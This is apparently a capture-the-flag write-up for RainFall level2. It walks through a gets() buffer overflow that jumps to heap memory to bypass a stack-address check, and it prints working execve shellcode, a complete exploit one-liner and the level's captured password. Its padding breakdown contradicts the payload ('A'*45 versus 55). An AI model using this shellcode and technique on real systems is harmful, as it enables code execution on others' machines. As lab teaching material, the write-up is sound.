# Level2: Buffer Overflow with Heap Execution

## Challenge Overview

In level2, we encounter a program that reads user input into a buffer and then copies it to the heap using `strdup()`. The program includes a protection mechanism that checks if the return address has been changed to point to the stack, but doesn't prevent redirection to the heap.

## Source Code Analysis

The source code for this level reveals the vulnerability:

```c
#include <stdio.h>    // For fflush, gets, printf, puts
#include <stdlib.h>   // For _exit
#include <string.h>   // For strdup
#include <unistd.h>   // Alternative for _exit
#include <stdint.h>   // For uint32_t

void p(void);

int main(void)
{
  p();
  return 0;
}

void p(void)
{
  uint32_t return_address;
  char buffer[76];

  // Clear the stdout buffer
  fflush(stdout);

  // Read input into buffer (vulnerable to buffer overflow)
  gets(buffer);

  // Check if return address starts with 0xb0000000 (stack address range)
  // This is a protection against typical stack buffer overflow exploits
  if ((return_address & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n", return_address);
    /* Process terminates here */
    _exit(1);
  }

  // Echo the input back to the user
  puts(buffer);

  // Duplicate the buffer (allocates heap memory)
  strdup(buffer);

  return;
}
```

Key observations:

1. The program uses `gets()`, which is vulnerable to buffer overflow
2. There's a protection check against stack-based exploits (addresses starting with 0xb)
3. The `strdup()` function copies our input to the heap

## The Vulnerability

This program has two key vulnerabilities:

1. **Buffer Overflow**: The use of `gets()` allows us to write beyond the 76-byte buffer
2. **Exploit Redirection**: Even though there's a check against stack-based exploits, we can redirect execution to the heap, which has addresses that typically start with 0x8

## Memory Layout and Protection Bypass

The protection check in this program targets stack addresses:

```c
if ((return_address & 0xb0000000) == 0xb0000000)
```

This checks if the highest 4 bits of the address are 0xb (1011 in binary). This is a common range for stack addresses in 32-bit Linux systems, but heap addresses typically start with 0x8, allowing us to bypass this check.

## Exploitation Strategy

Our approach leverages the heap memory allocated by `strdup()`:

1. Create a payload with a shellcode (a code that gives us a shell) at the beginning
2. Let `strdup()` copy our shellcode to the heap
3. Overflow the buffer to overwrite the return address with the heap address
4. When the function returns, execution jumps to our shellcode on the heap

## Finding the Heap Address

We used GDB to find where `strdup()` places our input:

```bash
level2@RainFall:~$ gdb -q ./level2
(gdb) disas p
# Looking at the disassembly to find the ret instruction
0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
0x0804853d <+105>:   leave
0x0804853e <+106>:   ret

(gdb) break *0x0804853e  # Set breakpoint at ret instruction
(gdb) run
# Input a test string
test

Breakpoint 1, 0x0804853e in p ()
(gdb) x/s $eax  # Examine the string at the address returned by strdup
0x804a008:       "test"
```

We discovered that `strdup()` consistently places our input at address `0x804a008` on the heap.

## Creating the Exploit

With this knowledge, we crafted an exploit with:

1. Shellcode to spawn a shell
2. Padding to fill the buffer
3. A value to overwrite the saved EBP
4. The heap address (0x804a008) to overwrite the return address

### Retrieving the Shellcode

To execute `/bin/sh`, we needed a shellcode that performs the `execve` system call. Instead of writing the shellcode ourselves, we retrieved a pre-written shellcode from [Shell-Storm](http://shell-storm.org/shellcode/), a well-known repository for shellcode.

We searched for "Linux/x86 - execve /bin/sh" on Shell-Storm and found [a compact 21-byte shellcode](https://shell-storm.org/shellcode/files/shellcode-575.html):

```assembly
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

This shellcode spawns a shell by invoking the `execve` system call with `/bin/sh` as the argument.

### Why We Need to Handle EBP

In level2, the saved EBP (Extended Base Pointer) is located between the buffer and the return address. This is different from level1, where the buffer is directly followed by the return address. We don't need to know what the EBP is for the purpose of this level, just that it occupies 4 bytes that must be accounted for in our exploit.

#### Key Difference Between Level1 and Level2

- **Level1**:

  ```assembly
  0x08048489 <+9>:     lea    0x10(%esp),%eax  # Buffer is allocated relative to ESP
  ```

  In level1, the buffer is allocated relative to ESP (Stack Pointer), and there is no saved EBP between the buffer and the return address.

- **Level2**:
  ```assembly
  0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax  # Buffer is allocated relative to EBP
  ```
  In level2, the buffer is allocated relative to EBP, and the saved EBP occupies 4 bytes between the buffer and the return address.

#### Exploit Adjustment

To craft the exploit for level2, we need to:

1. Fill the 76-byte buffer.
2. Overwrite the 4 bytes of saved EBP with any value (e.g., "BBBB").
3. Overwrite the return address with the heap address where our shellcode is stored. So that in runs our shellcode when the function returns.

## The Final Exploit

```bash
(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*55 + "BBBB" + "\x08\xa0\x04\x08"'; cat) | ./level2
```

Breaking it down:

- Shellcode (21 bytes): `\x6a\x0b\x58...` - Spawns /bin/sh
- Padding (55 bytes): `"A"*45` - Fills the remainder of the 76-byte buffer
- EBP overwrite (4 bytes): `"BBBB"` - Arbitrary value for the saved EBP
- Return address (4 bytes): `\x08\xa0\x04\x08` - 0x804a008 in little-endian format. Check level1's walkthrough for more details about little-endian.
- `cat` - Keeps stdin open for shell interaction. Check level1's walkthrough for more details.


## Getting the Password

After running the exploit, we get a shell and can read the password:

```bash
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

## Moving to Next Level

With the password obtained, we can now move to level3:

```bash
level2@RainFall:~$ su level3
Password: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
level3@RainFall:~$
```

## Lessons Learned

1. **Stack Protection Isn't Enough**: Simple checks on return addresses can be bypassed by using alternative memory regions like the heap.

2. **Memory Layout Understanding is Crucial**: Knowing how memory is organized (stack vs heap) allows for creative exploitation techniques.

3. **Dangerous Functions**: `gets()` remains dangerous regardless of additional checks because it allows unlimited input.

4. **Stack Frame Integrity**: When redirecting execution, properly managing the stack frame (including the EBP) is important for reliable exploits.